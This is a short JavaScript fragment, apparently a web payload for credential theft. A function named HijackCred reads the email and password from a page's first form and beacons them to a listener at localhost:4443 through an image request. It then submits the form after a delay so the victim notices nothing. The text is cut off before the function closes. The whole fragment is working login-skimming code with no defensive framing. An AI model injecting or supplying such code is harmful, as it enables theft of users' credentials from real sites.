function HijackCred() {
    var email = document.forms[0].elements[0].value;
    var pass = document.forms[0].elements[1].value;
    img = new Image();
img.src = "https://localhost:4443?" + "email=" + escape(email) + "&" + "password=" + escape(pass);
setTimeout('document.forms[0].submit();', 3000);
return false;
